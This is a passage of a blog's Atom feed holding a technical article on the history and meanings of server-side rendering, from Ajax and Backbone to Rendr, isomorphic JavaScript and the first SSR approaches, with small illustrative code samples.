<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Huli&#39;s blog</title>
  
  <subtitle>Learning by sharing</subtitle>
  <link href="https://blog.huli.tw/atom.xml" rel="self"/>
  
  <link href="https://blog.huli.tw/"/>
  <updated>2023-11-27T13:37:25.045Z</updated>
  <id>https://blog.huli.tw/</id>
  
  <author>
    <name>Huli</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  
  
  <entry>
    <title>Exploring Various SSR (Server-side rendering) from a Historical Perspective</title>
    <link href="https://blog.huli.tw/2023/11/27/en/server-side-rendering-ssr-and-isomorphic/"/>
    <id>https://blog.huli.tw/2023/11/27/en/server-side-rendering-ssr-and-isomorphic/</id>
    <published>2023-11-27T06:40:00.000Z</published>
    <updated>2023-11-29T12:47:11.342Z</updated>
    
    <content type="html"><![CDATA[<p>Did you know that when you discuss SSR with your friends, it’s highly likely that your understanding of SSR differs? Let’s take a few scenarios. Which ones do you consider as SSR?</p><ol><li>Generating the view from the backend using PHP.</li><li>Frontend is a React-based SPA, but if the backend detects a search engine, it switches to a different template that is specifically designed for search engines instead of the React-rendered page.</li><li>Frontend is a React-based SPA, but it uses Prerender to render the page as HTML and then serves it to the search engine (regular users still get the SPA experience). The difference from the previous scenario is that the view seen by users and search engines is mostly the same.</li><li>Frontend is a React-based SPA, and the backend uses <code>renderToString</code> to render React into a string, but there is no data. The data is fetched on the frontend.</li><li>Frontend is a React-based SPA, and the backend makes API calls to fetch data for each page. After fetching the data, it calls <code>renderToString</code> to output HTML. On the client-side, hydration is performed to make the page interactive.</li></ol><p>Some people believe that any view generated by the backend is considered SSR, so all scenarios 1 to 5 are SSR. Others think that the frontend must be an SPA for it to be called SSR, so scenarios 2 to 5 are SSR. Yet, some people consider hydration as the key aspect of SSR, so only scenario 5 (or 45) is SSR.</p><span id="more"></span><h2><span id="why-this-article">Why this article?</span></h2><p>Five years ago, I wrote an article discussing SPA and SSR: <a href="https://life-huli-tw.translate.goog/2018/05/04/introduction-mvc-spa-and-ssr-545c941669e9/?_x_tr_sl=zh-TW&_x_tr_tl=en&_x_tr_hl=zh-TW&_x_tr_pto=wapp">Understanding Technical Terms with Xiao Ming: MVC, SPA, and SSR</a>. My thoughts back then align with my current ones.</p><p>By “current me,” I mean that I haven’t fully organized my thoughts yet. I’m writing this preface, and the content below is still unfinished. I will share the thoughts of “future me” at the end. However, for now, my current perspective is that “not all ways of generating views from the server can be ‘appropriately’ called SSR.”</p><p>Let’s consider a hypothetical scenario:</p><p>A: Hey, how do you render your company’s web pages?<br>B: We use SSR.<br>A: Oh, so what framework do you use for SSR?<br>B: Just plain PHP, no framework. The frontend is built with jQuery.</p><p>Now, another example:</p><p>A: Dealing with SSR issues has been quite frustrating lately. It’s challenging to handle the data.<br>B: It’s been fine for us. We’ve been using PHP without any major issues.</p><p>Although the term “server-side rendering” literally means rendering by the server, so there’s no problem in calling PHP SSR based on its literal meaning, I believe the key question is “Why do we need the term SSR?”</p><p>My understanding is that in the era before SPA became popular, there wasn’t much that fell under CSR (Client-side rendering), so there was no need for the term SSR. At that time, you would simply say, “We use PHP” rather than saying, “We use PHP for SSR.”</p><p>It’s somewhat similar to when I ask my friend how much his lunchbox costs, and he replies, “100 bucks” instead of “100 New Taiwan Dollars” because we assume the currency is New Taiwan Dollars, so there’s no need to explicitly mention it. Similarly, back then, there was only one path of rendering from the server, so there was no need to specifically mention SSR.</p><p>However, with the rise of SPAs, many things started to shift towards CSR. This led to problems that only CSR encounters, such as SEO. In such cases, certain aspects need to be handled by the server to solve these problems. In this context, the term “Server-side rendering” took on a new meaning, becoming a “server-side solution to address CSR issues.”</p><p>Therefore, calling PHP SSR is not entirely accurate; it lacks meaning.</p><p>It’s like if we define “beverage” as “a drinkable liquid,” can you say that hot and sour soup is also a type of beverage? Technically, there’s no issue with the definition, but when someone asks you, “What’s your favorite beverage?” would you say hot and sour soup? Probably not. Similarly, we don’t refer to hot and sour soup as a beverage.</p><p>Likewise, although SSR literally means that, PHP, which is a traditional server-side content rendering solution, can be called SSR, but you wouldn’t refer to it that way. SSR is more suitable to refer to a “server-side solution used to address SPA issues.”</p><p>I started to become curious at this point. Was SSR really not commonly used before the popularity of SPA and CSR? If so, when did it start? Also, my understanding of SSR basically started with React. So, did earlier frameworks like Angular, Ember, or even Backbone not have this issue? If they did, what were their solutions called?</p><p>So, I embarked on a journey of exploration that would take a lot of time, perhaps discussing issues that may not be so important, but I enjoyed the process.</p><h2><span id="when-did-spa-become-popular">When did SPA become popular?</span></h2><p>As mentioned earlier, my argument is that the term “SSR” started to become popular after the rise of SPA, specifically referring to server-side solutions for handling CSR and SPA issues.</p><p>I believe that the development of SPA is closely related to the overall development of frontend web technologies. So, let’s take a look back at history!</p><p>JavaScript was officially introduced in 1995. Although JavaScript’s functionality was not as mature at the time, there were already other technologies that could run an application on a webpage, such as Java Applets.</p><p>Flash was released in 1996. In the early days when JavaScript was not as powerful, Java Applets or Flash were used to create more complete web applications.</p><p>So, when did JavaScript mature enough to stand on its own and be used to write a web application? The answer is related to technological advancements. As a web application that needs to communicate with the backend, what is most needed?</p><p>It is something that now exists as naturally as air and water: XMLHttpRequest.</p><p>To be able to operate independently and communicate with the server without page reloads, XMLHttpRequest is a necessary condition. We needed the XMLHttpRequest API to exchange data with the server without page reloads.</p><p>However, in the beginning, not all browsers used XMLHttpRequest. Microsoft, which had the concept first, used ActiveXObject. This can be verified from the first version of jQuery’s source code from 2006:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// If IE is used, create a wrapper for the XMLHttpRequest object</span><span class="token keyword">if</span> <span class="token punctuation">(</span> jQuery<span class="token punctuation">.</span>browser<span class="token punctuation">.</span>msie <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> XMLHttpRequest <span class="token operator">==</span> <span class="token string">"undefined"</span> <span class="token punctuation">)</span>  <span class="token function-variable function">XMLHttpRequest</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ActiveXObject</span><span class="token punctuation">(</span>      navigator<span class="token punctuation">.</span>userAgent<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"MSIE 5"</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">?</span>        <span class="token string-property property">"Microsoft.XMLHTTP"</span> <span class="token operator">:</span> <span class="token string">"Msxml2.XMLHTTP"</span>      <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>After mentioning XMLHttpRequest, it is natural to talk about Ajax. The term “Ajax” comes from an article published by Jesse James Garrett on February 18, 2005, titled <a href="https://web.archive.org/web/20061107032631/http://www.adaptivepath.com/publications/essays/archives/000385.php">Ajax: A New Approach to Web Applications</a>. It describes a new communication pattern using HTML, CSS, DOM, and XMLHttpRequest, which I believe is the prototype of SPA.</p><p><img src="/img/server-side-rendering-ssr-and-isomorphic/p2.png" alt="ajax"></p><p>(Image from the mentioned article)</p><p>In the article, there is also a mention of the difference between XMLHttpRequest and Ajax:</p><blockquote><p>Q. Is Ajax just another name for XMLHttpRequest?<br>A. No. XMLHttpRequest is only part of the Ajax equation. XMLHttpRequest is the technical component that makes the asynchronous server communication possible; Ajax is our name for the overall approach described in the article, which relies not only on XMLHttpRequest but on CSS, DOM, and other technologies.</p></blockquote><p>From historical data, it seems that Microsoft Outlook was the earliest product to mention and utilize these technologies, starting in 2000. However, in terms of widespread use and popularization of the term, it belongs to Google around 2004-2005.</p><p>Around this time, the JavaScript ecosystem also experienced vigorous development. Many libraries emerged, such as Prototype, Dojo Toolkit, MooTools, and the still-existing jQuery, which further advanced frontend web development. In 2006, YUI (Yahoo! User Interface Library) was born, and Ext JS, a framework specifically designed for web applications, appeared in 2007.</p><p>Although these libraries make web development easier, SPA did not become popular until the birth of two pioneers.</p><p>On October 13, 2010, Backbone.js released its first version, followed by the initial release of AngularJS a week later on October 20.</p><p>A year later, other SPA frontend frameworks emerged. Ember.js was released on December 8, 2011, and Meteor.js appeared on January 20, 2012.</p><p>Typically, it takes at least six months to a year for a new framework to become popular. Therefore, I believe that 2011 and 2012 marked the beginning of the rise of SPA. But how can we support this claim?</p><p>Keyword search trends to some extent represent the popularity of certain technical terms at the time. From the graph below, we can see that the term “SPA” started to climb around 2011 and 2012, which aligns with my speculation (although this data may not be very accurate, I couldn’t think of a better source at the moment):</p><p><img src="/img/server-side-rendering-ssr-and-isomorphic/p3.png" alt="SPA Search Trend"></p><p>(As for the peak in 2004 and 2005, I don’t know, but I’m curious to find out. Maybe it’s related to the popularity of various Google services? If anyone has any clues, feel free to message or comment to discuss.)</p><p>The rest of the story is more familiar. React was officially released in May 2013, followed by Vue in February 2014. With the rise of frontend frameworks, SPA became increasingly popular and eventually became the mainstream approach to frontend development today.</p><h2><span id="how-did-early-spas-solve-the-csr-problem">How did early SPAs solve the CSR problem?</span></h2><p>From the history of development mentioned above, it is clear that Backbone.js and AngularJS were the pioneers that ushered in the era of SPAs. But how did they solve the CSR problem, such as SEO?</p><p>Let’s start with AngularJS. I found a project on GitHub from 2013: <a href="https://github.com/runvnc/angular-on-server/tree/b84bcea97037adaffc83cf4869fe9a008c7db3a8">angular-on-server</a>. In the project’s wiki introduction, it states:</p><blockquote><p>We need to pre-render pages on the server for Google to index. We don’t want to have to repeat ourselves on the back end. I found a few examples of server-side rendering for Backbone applications, but none showing how to do it with AngularJS. To make this work I have modified a couple of Node modules, jsdom and xmlhttprequest. They are loaded from local subdirectories (&#x2F;jsdom-with-xmlhttprequest and &#x2F;xmlhttprequest).</p></blockquote><p>If this is true, it means that AngularJS had limited SSR solutions at that time, with most solutions being based on Backbone.js.</p><p>Based on the information I found, it seems to be the case. For example, this question from 2013: <a href="https://stackoverflow.com/questions/16232631/angularjs-server-side-rendering">AngularJS - server-side rendering</a>. From the answers, it is evident that there were indeed limited solutions available.</p><p>AngularJS officially supported SSR only in late June 2015, as mentioned in this presentation: <a href="https://www.youtube.com/watch?v=0wvZ7gakqV4">Angular 2 Server Rendering</a>. A few days after the presentation, they open-sourced <a href="https://github.com/angular/universal/tree/e5b088ef4a59e59461fee31a21c2a81b742a7df5">Universal Angular 2</a>, which is the predecessor of Angular Universal.</p><p>In the README at that time, it stated:</p><blockquote><p>Universal (isomorphic) JavaScript support for Angular 2</p></blockquote><p>The term “isomorphic” should bring back memories for many people, but we’ll discuss that later. Now, let’s see how Backbone.js solved the SPA problem.</p><p>I found an ancient example on GitHub from 2011: <a href="https://github.com/runemadsen/Backbone-With-Server-Side-Rendering">Backbone-With-Server-Side-Rendering</a>. The README states:</p><blockquote><p>Backbone.js is a great tool for organizing your javascript code into models, collections, and views, without tying your data to the DOM elements. However, most tutorials show how to render the HTML only via Backbone (client-side), which means that none of your content is crawled by search engines. This is possibly a major problem if you’re not making an app hidden behind an authentication system.</p></blockquote><p>The unique thing about this project is that SSR (Server-Side Rendering) is implemented through Ruby on Rails. However, after examining the source code, it seems more like an experimental project. The HTML is outputted by the backend and then handled by Backbone.js on the frontend. It is a simple example rather than a complete demo.</p><p>If you want a more complete solution, the one to consider is <a href="https://github.com/rendrjs/rendr">Rendr</a>, which was open-sourced by Airbnb in 2013.</p><p>On January 30, 2013, Airbnb’s tech blog published a new article titled <a href="https://web.archive.org/web/20130711035708/http://nerds.airbnb.com/weve-launched-our-first-nodejs-app-to-product/">Our First Node.js App: Backbone on the Client and Server</a>. It discusses the issues with Single Page Applications (SPAs) and the challenge of integrating logic on both the frontend and backend. The ultimate solution presented in the article is the Rendr package, which allows executing Backbone.js on the server.</p><p>The open-sourcing of Rendr was announced in an article three months later, titled <a href="https://web.archive.org/web/20130623194723/http://nerds.airbnb.com/weve-open-sourced-rendr-run-your-backbonejs-a/">We’ve open sourced Rendr: Run your Backbone.js apps in the browser and Node.js</a>. It states:</p><blockquote><p>Many developers shared the same pain points with the traditional client-side MVC approach: poor pageload performance, lack of SEO, duplication of application logic, and context switching between languages.</p></blockquote><p>This indicates that many developers at that time were aware of the issues with SPAs and were seeking a more comprehensive solution.</p><p>To execute Backbone.js on the server, a prerequisite is that the server must be able to run JavaScript.</p><p>Node.js was released in 2009, and Express came out at the end of 2010, while NPM was introduced in 2011. By mid-2012, Node.js was still at version <a href="https://nodejs.org/en/blog/release/v0.8.0/">v0.8.0</a>, which was an early stage. Looking back now, Node.js started to be widely used around 2012-2013.</p><p>In summary, based on the information I found, the library that was perhaps widely used for SSR earliest was Rendr, introduced in 2013. It can achieve the following: “rendering on the server-side initially, but then taken over by JavaScript on the client-side,” as mentioned in Airbnb’s article:</p><blockquote><p>Your great new product can run on both sides of the wire, serving up real HTML on first pageload, but then kicking off a client-side JavaScript app. In other words, the Holy Grail.</p></blockquote><p>The image below illustrates the so-called Holy Grail, taken from Airbnb’s original article:</p><p><img src="/img/server-side-rendering-ssr-and-isomorphic/p4.png" alt="holy grail"></p><p>When it comes to this point, let’s organize the timeline and my personal speculation.</p><p>Since the release of Backbone.js at the end of 2010, SPA (Single Page Application) has gradually become popular, and people have also realized the problems encountered in front-end rendering. Therefore, they started to implement different solutions, which is server-side rendering.</p><p>Backbone.js continued until 2013 when Airbnb open-sourced Rendr, finally providing an ideal solution: “initial rendering on the server-side, and subsequent rendering on the client-side, with both client and server sharing the same codebase.”</p><p>The concept of “running the same code on both the client and the server” is what was mentioned earlier as isomorphic.</p><p>By the way, Ember.js’s official SSR (Server-Side Rendering) solution should be this one at the end of 2014: <a href="https://blog.emberjs.com/inside-fastboot-the-road-to-server-side-rendering/">Inside FastBoot: The Road to Server-Side Rendering</a></p><p>One more thing to mention, according to the article <a href="https://blog.risingstack.com/the-history-of-react-js-on-a-timeline/">The History of React.js on a Timeline</a>, <a href="https://github.com/jordwalke/FaxJs/tree/5962e3a7268fc4fe0251631ec9d874f0c0f52b66">FaxJS</a> is the predecessor of React, and when it was open-sourced at the end of 2011, it already had an API for server-side rendering, which could render components into static HTML and reattach events on the client-side: <a href="https://github.com/jordwalke/FaxJs/tree/5962e3a7268fc4fe0251631ec9d874f0c0f52b66#optional-server-side-rendering">https://github.com/jordwalke/FaxJs/tree/5962e3a7268fc4fe0251631ec9d874f0c0f52b66#optional-server-side-rendering</a></p><h2><span id="isomorphic-javascript">Isomorphic JavaScript</span></h2><p>The term “Isomorphic JavaScript” comes from an article published by Charlie Robbins on October 18, 2011: <a href="https://web.archive.org/web/20170703210112/https://blog.nodejitsu.com/scaling-isomorphic-javascript-code/">Scaling Isomorphic Javascript Code</a></p><p>The article defines Isomorphic as follows:</p><blockquote><p>Javascript is now an isomorphic language. By isomorphic we mean that any given line of code (with notable exceptions) can execute both on the client and the server.</p></blockquote><p>More details can be found in an article published by Airbnb on November 12, 2013: <a href="https://medium.com/airbnb-engineering/isomorphic-javascript-the-future-of-web-apps-10882b7a2ebc">Isomorphic JavaScript: The Future of Web Apps</a></p><p>The article also includes a practical example that is worth referring to: <a href="https://github.com/spikebrehm/isomorphic-tutorial/tree/b54098ba61f4e766fee8c660e3d074c5eca07dfa">isomorphic-tutorial</a>.</p><p>In addition, the article mentions three predecessors of Isomorphic JavaScript before Rendr. One of them is Mojito, open-sourced by Yahoo! in 2012. The article mentions a beautiful imagination:</p><blockquote><p>Imagine a framework where the first page-load was always rendered server-side, and desktop browsers subsequently just made calls to API endpoints returning JSON or XML, and the client only rendered the changed portions of the page.</p></blockquote><p>It is basically the current mainstream way of working in front-end development.</p><p>Another one is Meteor.js, and the third one is Asana’s <a href="https://web.archive.org/web/20110211193136/https://asana.com/luna">Luna</a>. Luna is quite interesting, and upon closer inspection, its syntax has a bit of a React flavor.</p><p>The term “Isomorphic” was gradually replaced by “Universal” after Michael Jackson’s article in 2015: <a href="https://medium.com/@mjackson/universal-javascript-4761051b7ae9">Universal JavaScript</a>.</p><p>This article mainly suggests that “Universal” better expresses the original intention and is easier for the audience to understand. Therefore, it advocates using “Universal JavaScript” instead of “Isomorphic JavaScript”.</p><h2><span id="mid-summary">Mid-summary</span></h2><p>Up to this point, I have answered a few of my previous questions:</p><blockquote><p>Q: Was the term SSR really not used much before the popularity of SPA and CSR? If so, when did it start?</p></blockquote><p>I’m not sure because I didn’t specifically search for earlier evidence. However, if we look at the search trend for the term SSR, it started to take off around 2012-2013, which is around the same time as the popularity of SPA.</p><p><img src="/img/server-side-rendering-ssr-and-isomorphic/p5.png" alt="SSR Search Trend"></p><blockquote><p>Q: My understanding of SSR basically started with React. Does that mean earlier frameworks like Angular, Ember, or even Backbone didn’t have this issue? If they did, what was their solution called?</p></blockquote><p>They had the same issue, and the solution was also called SSR.</p><p>To be honest, discussing the precise definition of the term SSR doesn’t have much significance. It can be a bit nitpicky, and it’s difficult to reach a conclusion or convince others that “this definition is correct.” The key is to ensure that both parties have a consistent understanding during communication.</p><p>When talking about SSR, many people only focus on the SEO aspect, but if we think a bit more carefully, SSR is needed for more than just SEO.</p><h2><span id="problems-ssr-aims-to-solve">Problems SSR Aims to Solve</span></h2><p>SSR aims to solve the problems caused by CSR, including:</p><ol><li>SEO</li><li>Link previews on various social platforms</li><li>Performance</li><li>User experience</li></ol><p>If CSR is used, since the UI is generated through JavaScript, search engines will only crawl blank HTML. Even if Google executes JavaScript, other search engines may not. Even if all search engines execute JavaScript, you can’t guarantee that the crawled results will be what you want.</p><p>For example, it’s difficult to know when they will finish executing JavaScript. If the API for fetching data takes two seconds to respond, and the search engine only waits for one second after executing JavaScript, the result will still be empty.</p><p>Link previews on social platforms are another problem. The <code>&lt;meta&gt;</code> tags generated on the client side are not useful. Usually, the bots of these social platforms don’t execute JavaScript; they only look at the response. Therefore, the <code>&lt;meta&gt;</code> tags on CSR pages can only be the same and cannot dynamically determine the content based on different pages.</p><p>The third and fourth points can be considered together. Although modern devices generally run fast and can execute JavaScript quickly, in cases where the JavaScript is large and the device is older, executing JavaScript still takes some time.</p><p>When will the user see the UI of a CSR page? They need to download the JavaScript first, and after downloading, it needs to be executed. After executing and updating the DOM, the user can see the complete UI. During the waiting period, the screen is blank. Although some websites show a loading indicator, the overall user experience is not very good.</p><p>If we can get the UI in the initial response, the user experience will be better, and performance will increase. Even on older devices, users can see the UI from the beginning without waiting for JavaScript to finish executing.</p><h2><span id="various-types-of-ssr">Various Types of SSR</span></h2><p>Originally, I only wanted to write this paragraph, but unexpectedly, it turned into a historical archaeology of front-end development.</p><p>In response to the problems caused by CSR mentioned earlier, various solutions have emerged. Each solution is different, and not all problems can be solved at once.</p><h3><span id="type-1-rendering-a-different-template-for-search-engines-and-bots">Type 1: Rendering a different template for search engines and bots</span></h3><p>This solution only solves the problems of SEO and link previews. When the server receives a request from a search engine or a bot from a social platform, it directly uses the original backend template to output the result.</p><p>Like this:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/games/:id'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> userAgent <span class="token operator">=</span> req<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'user-agent'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// Check user agent</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>userAgent<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'Googlebot'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// render the SEO template for the bot</span>    <span class="token keyword">const</span> game <span class="token operator">=</span> <span class="token constant">API</span><span class="token punctuation">.</span><span class="token function">getGame</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">      &lt;html>        &lt;head>          &lt;title></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>game<span class="token punctuation">.</span>title<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/title>          &lt;meta name="description" content="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>game<span class="token punctuation">.</span>desc<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">">        &lt;/head>          &lt;body>            &lt;h1></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>game<span class="token punctuation">.</span>title<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/h1>            &lt;p></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>game<span class="token punctuation">.</span>desc<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/p>          &lt;/body>        &lt;/html>    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// return index.html for regular users</span>    res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> <span class="token string">'/public/index.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Server is running on port 3000'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>For regular users, the issues of performance and user experience are still not resolved. This solution only addresses SEO and link preview, ensuring that the web page captured by these bots has data.</p><p>I have implemented this approach in my work, and the advantages are that it is simple, fast, and does not interfere with SPA. The disadvantage is that the page seen by the Google bot may be different from what the user sees, which could potentially affect SEO scores. After all, outputting special pages for the Google bot is considered an anti-pattern called cloaking, as mentioned in Google’s official video: <a href="https://www.youtube.com/watch?v=wBO-1ETf_dY&ab_channel=GoogleSearchCentral">Can we serve Googlebot a different page with no ads?</a>. It is recommended to have the exact same page.</p><p>However, compared to not showing anything to the Google bot, this solution is still better.</p><h3><span id="second-approach-pre-rendering-for-search-engines">Second Approach: Pre-rendering for Search Engines</span></h3><p>The most well-known framework for this approach is <a href="https://github.com/prerender/prerender">Prerender</a>. In simple terms, it uses a headless browser like Puppeteer on the server-side to open your page and execute JavaScript, then saves the result as HTML.</p><p>When the search engine requests data, this HTML is served, so both users and bots see the same content.</p><p>I tried it locally and created a simple page using create-react-app:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> logo <span class="token keyword">from</span> <span class="token string">'./logo.svg'</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">'./App.css'</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">&#123;</span> useState<span class="token punctuation">,</span> useEffect <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'render'</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> <span class="token punctuation">[</span>data<span class="token punctuation">,</span> setData<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">useEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'title'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textContent <span class="token operator">=</span> <span class="token string">'I am new title'</span>     <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://cat-fact.herokuapp.com/facts/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=></span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">a</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token function">setData</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token operator">&lt;</span>div className<span class="token operator">=</span><span class="token string">"App"</span><span class="token operator">></span>      <span class="token operator">&lt;</span>header className<span class="token operator">=</span><span class="token string">"App-header"</span><span class="token operator">></span>        <span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token punctuation">&#123;</span>logo<span class="token punctuation">&#125;</span> className<span class="token operator">=</span><span class="token string">"App-logo"</span> alt<span class="token operator">=</span><span class="token string">"logo"</span> <span class="token operator">/</span><span class="token operator">></span>        <span class="token punctuation">&#123;</span>data <span class="token operator">&amp;&amp;</span> data<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">item</span> <span class="token operator">=></span> <span class="token punctuation">(</span>          <span class="token operator">&lt;</span>div<span class="token operator">></span><span class="token punctuation">&#123;</span>item<span class="token punctuation">.</span>text<span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>        <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>        <span class="token operator">&lt;</span>a          className<span class="token operator">=</span><span class="token string">"App-link"</span>          href<span class="token operator">=</span><span class="token string">"https://reactjs.org"</span>          target<span class="token operator">=</span><span class="token string">"_blank"</span>          rel<span class="token operator">=</span><span class="token string">"noopener noreferrer"</span>        <span class="token operator">></span>          Learn React          Can you see me now<span class="token operator">?</span>        <span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span>        <span class="token operator">&lt;</span>button onClick<span class="token operator">=</span><span class="token punctuation">&#123;</span>test<span class="token punctuation">&#125;</span><span class="token operator">></span>hello<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span>      <span class="token operator">&lt;</span><span class="token operator">/</span>header<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The main points I wanted to test were:</p><ol><li>Whether the page is still interactive.</li><li>Whether dynamically modified titles are reflected in the results.</li><li>Whether the output includes the results obtained from an API response.</li></ol><p>After prerendering, the output HTML is:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token 